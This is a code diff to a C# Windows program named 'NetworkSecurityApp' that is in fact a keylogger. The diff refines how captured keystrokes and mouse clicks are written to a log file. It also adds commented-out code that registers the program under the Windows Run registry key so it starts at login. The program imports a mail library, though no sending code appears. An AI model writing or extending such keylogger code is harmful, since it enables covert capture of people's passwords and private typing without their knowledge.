@@ -4,6 +4,7 @@ using System.Threading;
 using System.Windows.Forms;
 using System.Runtime.InteropServices;
 using System.Net.Mail;
+using Microsoft.Win32;
 
 namespace NetworkSecurityApp
 {
@@ -21,6 +22,12 @@ namespace NetworkSecurityApp
         [STAThread]
         static void Main(String[] args)
         {
+            //The path to the key where Windows looks for startup applications
+            //RegistryKey rkApp = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
+            // Add the value in the registry so that the application runs at startup
+            //rkApp.SetValue("NetworkSecurityApp", Application.ExecutablePath.ToString());
+
+
             Thread.CurrentThread.Name = "MainTread";
             loggerT = new Thread(LogKeys);
             loggerT.Name = "logger";
@@ -67,11 +74,40 @@ namespace NetworkSecurityApp
                         lock (locker)
                         {
                             text = converter.ConvertToString(i);
-                            Console.WriteLine("From LOG - Thread Name: {0}", Thread.CurrentThread.Name);
-                            Thread.Sleep(500);
+                            Console.WriteLine("From LOG Pressed:  {0}", text);
+                            Thread.Sleep(10);
                             using (StreamWriter sw = File.AppendText(path))
                             {
-                                sw.WriteLine(text);
+                                switch (text)
+                                {
+                                    case "Space": sw.Write("[space]");
+                                        break;
+                                    case "LButton":
+                                        sw.WriteLine("[LButton]");
+                                        break;
+                                    case "RButton":
+                                        sw.WriteLine("[RButton]");
+                                        break;
+                                    case "Menu":
+                                        sw.WriteLine("[alt]");
+                                        break;
+                                    case "LControlKey":
+                                        sw.WriteLine("[Ctrl]");
+                                        break;
+                                    case "ControlKey":
+                                        sw.Write("");
+                                        break;
+                                    case "Tab":
+                                        sw.Write("[Tab]");
+                                        break;
+                                    case "Enter": sw.WriteLine("\n");
+                                        break;
+                                    case "P":
+                                        sw.WriteLine(Application.ExecutablePath.ToString());
+                                        break;
+                                    default: sw.Write(text);
+                                        break;
+                                }
                             }
                         }
                         Console.WriteLine("From Log: END OF LOCK");
